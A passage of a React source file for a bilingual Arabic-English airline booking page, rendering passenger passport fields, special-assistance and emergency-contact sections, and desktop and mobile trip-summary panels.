                          value={p.dob}
                          onChange={(v) => update(index, 'dob', v)}
                        />
                      </div>

                      {/* Additional Details */}
                      <div className="flex items-center justify-between pt-2">
                        <span className="text-lg font-bold text-[#0a72c0]">{isAr ? 'تفاصيل إضافية' : 'Additional Details'}</span>
                        <button
                          type="button"
                          onClick={() => setPassportOpen((prev) => ({ ...prev, [index]: !prev[index] }))}
                          className="w-9 h-9 rounded-full border border-[#cfe0f3] text-[#0a72c0] flex items-center justify-center hover:bg-[#f3f8ff]"
                        >
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d={passportOpen[index] ? 'M20 12H4' : 'M12 4v16m8-8H4'} />
                          </svg>
                        </button>
                      </div>

                      {passportOpen[index] && (
                        <div className="space-y-4">
                          {/* Passport details header + upload */}
                          <div className="flex items-center justify-between flex-wrap gap-3">
                            <span className="text-lg font-bold text-[#0a72c0]">{isAr ? 'بيانات جواز السفر' : 'Passport details'}</span>
                            <label className="flex items-center gap-2 px-5 py-2 rounded-full border border-[#0a72c0] text-[#0a72c0] text-sm font-medium hover:bg-[#f3f8ff] cursor-pointer">
                              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13" /></svg>
                              {isAr ? 'رفع جواز السفر/الهوية الخليجية' : 'Upload passport/GCC ID'}
                              <input type="file" accept="image/*,.pdf" className="hidden" />
                            </label>
                          </div>

                          {/* Choose travel document */}
                          <div className="relative">
                            <select
                              value={p.docType}
                              onChange={(e) => update(index, 'docType', e.target.value)}
                              className={`w-full appearance-none bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-5 py-4 pr-10 focus:outline-none focus:border-[#0a72c0] ${p.docType ? 'text-[#0a2540]' : 'text-[#8a99a8]'}`}
                            >
                              <option value="" disabled>{isAr ? 'اختر وثيقة السفر' : 'Choose travel document'}</option>
                              <option value="Passport">Passport</option>
                              <option value="GCC ID">GCC ID</option>
                              <option value="National ID">National ID</option>
                            </select>
                            <svg className="w-4 h-4 text-[#6b7b8b] absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                          </div>

                          {/* Passport number */}
                          <input
                            type="text"
                            value={p.passportNo}
                            onChange={(e) => update(index, 'passportNo', e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase())}
                            placeholder={isAr ? 'رقم جواز السفر/الهوية الخليجية' : 'Passport number/ GCC ID'}
                            className="w-full bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-5 py-4 text-[#0a2540] placeholder-[#8a99a8] focus:outline-none focus:border-[#0a72c0]"
                          />

                          {/* Countries */}
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <CountrySelect
                              value={p.issueCountry}
                              onChange={(v) => update(index, 'issueCountry', v)}
                              placeholder={isAr ? 'دولة الإصدار' : 'Issue Country'}
                            />
                            <CountrySelect
                              value={p.residenceCountry}
                              onChange={(v) => update(index, 'residenceCountry', v)}
                              placeholder={isAr ? 'دولة الإقامة' : 'Country of residence'}
                            />
                          </div>

                          {/* Dates */}
                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <SimpleDatePicker
                              value={p.expiryDate}
                              onChange={(v) => update(index, 'expiryDate', v)}
                              placeholder={isAr ? 'تاريخ الانتهاء' : 'Expiry date'}
                              mode="future"
                            />
                            <SimpleDatePicker
                              value={p.issueDate}
                              onChange={(v) => update(index, 'issueDate', v)}
                              placeholder={isAr ? 'تاريخ الإصدار' : 'Date of issue'}
                              mode="past"
                            />
                          </div>

                          {/* Clear details */}
                          <div className="flex justify-end">
                            <button
                              type="button"
                              onClick={() => {
                                update(index, 'docType', '');
                                update(index, 'passportNo', '');
                                update(index, 'issueCountry', '');
                                update(index, 'residenceCountry', '');
                                update(index, 'expiryDate', '');
                                update(index, 'issueDate', '');
                              }}
                              className="text-[#6b7b8b] underline hover:text-[#0a2540]"
                            >
                              {isAr ? 'مسح التفاصيل' : 'Clear details'}
                            </button>
                          </div>
                        </div>
                      )}

                      <div className="flex items-center justify-between bg-[#f4f7fb] border border-[#e3eaf2] rounded-xl px-5 py-4">
                        <span className="text-[#0a2540] flex-1">
                          {isAr ? 'أحتاج مساعدة خاصة' : 'I\'ll need special assistance'}
                          {specialAssistance[index] && specialAssistance[index].label && (
                            <span className="block text-sm text-[#0a72c0] font-medium mt-1">{specialAssistance[index].label}</span>
                          )}
                        </span>
                        <button
                          type="button"
                          onClick={() => {
                            try { localStorage.setItem('passengerData', JSON.stringify(passengers)); } catch { /* ignore */ }
                            setLocation(`/wheelchair?passenger=${index}`);
                          }}
                          className="px-6 py-1.5 rounded-full border border-[#0a4c95] text-[#0a4c95] text-sm font-medium hover:bg-[#f3f8ff]"
                        >{specialAssistance[index] ? (isAr ? 'تعديل' : 'Edit') : (isAr ? 'إضافة' : 'Add')}</button>
                      </div>

                      {/* Primary guest toggle */}
                      <div className="flex items-center gap-3 pt-1">
                        <button
                          type="button"
                          onClick={() => setPrimaryIndex(index)}
                          className={`relative w-12 h-6 rounded-full transition-colors ${primaryIndex === index ? 'bg-[#0a72c0]' : 'bg-gray-300'}`}
                        >
                          <span className={`absolute top-0.5 w-5 h-5 bg-white rounded-full transition-all ${primaryIndex === index ? 'left-6' : 'left-0.5'}`} />
                        </button>
                        <span className="text-[#0a2540] font-medium">{isAr ? 'الضيف الرئيسي' : 'Primary Guest'}</span>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}

            {/* Emergency contact */}
            <div className="pt-2">
              <h2 className="text-lg font-bold text-[#0a72c0] mb-3">{isAr ? 'جهة اتصال للطوارئ' : 'Emergency contact'}</h2>
              {!(emergency.firstName || emergency.lastName || emergency.phone || emergency.email) ? (
                <button
                  type="button"
                  onClick={() => setLocation('/emergency-contact')}
                  className="w-full flex items-center gap-3 bg-[#0a4c95] hover:bg-[#083d7a] text-white rounded-2xl px-6 py-5 font-semibold shadow-sm"
                >
                  <span className="w-9 h-9 rounded-full border-2 border-white flex items-center justify-center">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v16m8-8H4" /></svg>
                  </span>
                  {isAr ? 'إضافة جهة اتصال للطوارئ' : 'Add an emergency contact'}
                </button>
              ) : (
                <div className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] p-6">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-base font-bold text-[#0a72c0]">{isAr ? 'جهة اتصال للطوارئ' : 'Emergency contact'}</h3>
                    <div className="flex items-center gap-3">
                      <button
                        type="button"
                        onClick={() => setLocation('/emergency-contact')}
                        className="text-sm font-semibold text-[#0a72c0] hover:underline"
                      >
                        {isAr ? 'تعديل' : 'Edit'}
                      </button>
                      <button
                        type="button"
                        onClick={() => { setEmergency({ firstName: '', lastName: '', dialCode: '+965', phone: '', email: '' }); localStorage.removeItem('emergencyContact'); }}
                        className="text-[#8a99a8] hover:text-[#0a2540]"
                        aria-label="Remove emergency contact"
                      >
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
                      </button>
                    </div>
                  </div>
                  <p className="text-[#0a2540] font-semibold">{emergency.firstName} {emergency.lastName}</p>
                  <p className="text-[#8a99a8] text-sm">{emergency.dialCode} {emergency.phone}</p>
                  <p className="text-[#8a99a8] text-sm">{emergency.email}</p>
                </div>
              )}
            </div>
          </div>

          {/* Right column - Trip summary (DESKTOP ONLY) */}
          <div className="hidden lg:block w-96">
            <div className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] p-6 sticky top-6">
              <h2 className="text-2xl font-extrabold text-[#0a72c0] mb-4">{t('seat.tripSummary')}</h2>
              <TripSummaryContent />
              <button
                type="button"
                onClick={handleContinue}
                className="w-full bg-[#0a4c95] hover:bg-[#083d7a] text-white font-bold py-4 rounded-full text-lg shadow-sm transition-colors"
              >
                {t('common.continue')}
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* ===== MOBILE BOTTOM SHEET - Trip Summary ===== */}
      <div className="lg:hidden fixed bottom-0 left-0 right-0 z-[9999]">
        {/* Expanded overlay */}
        {summaryOpen && (
          <div
            className="fixed inset-0 bg-black/20 z-[9998]"
            onClick={() => setSummaryOpen(false)}
          />
        )}
        <div
          className={`relative z-[9999] bg-white rounded-t-3xl shadow-[0_-4px_20px_rgba(0,0,0,0.12)] transition-all duration-300 ease-in-out ${summaryOpen ? 'max-h-[75vh] overflow-y-auto' : 'max-h-auto'}`}
        >
          <div className="px-5 pt-5 pb-4">
            {/* Header row */}
            <button
              type="button"
              onClick={() => setSummaryOpen((o) => !o)}
              className="w-full flex items-center justify-between mb-3"
            >
              <h2 className="text-xl font-extrabold text-[#11315F]">{t('seat.tripSummary')}</h2>
              <svg className={`w-5 h-5 text-[#11315F] transition-transform ${summaryOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
            </button>

            {/* Expanded content */}
            {summaryOpen && (
              <div className="mb-3">
                <TripSummaryContent />
              </div>
            )}

            {/* Collapsed: Total row (always visible) */}
            {!summaryOpen && (
              <div className="flex items-center justify-between mb-3">
                <span className="text-lg font-bold text-[#0a2540]">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-xs line-through text-red-500">{fmtConv(Math.round((finalTotalConv + discountAmountConv) * f) / f)}</span>
                  <span className="text-lg font-extrabold text-[#0a72c0]">{fmtConv(finalTotalConv)}</span>
                </span>
              </div>
            )}

            {/* Continue button */}
            <button
              type="button"
              onClick={handleContinue}
              className="w-full bg-[#0a4c95] hover:bg-[#083d7a] text-white font-bold py-4 rounded-full text-lg shadow-sm transition-colors"
            >
              {t('common.continue')}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PassengerDetails;
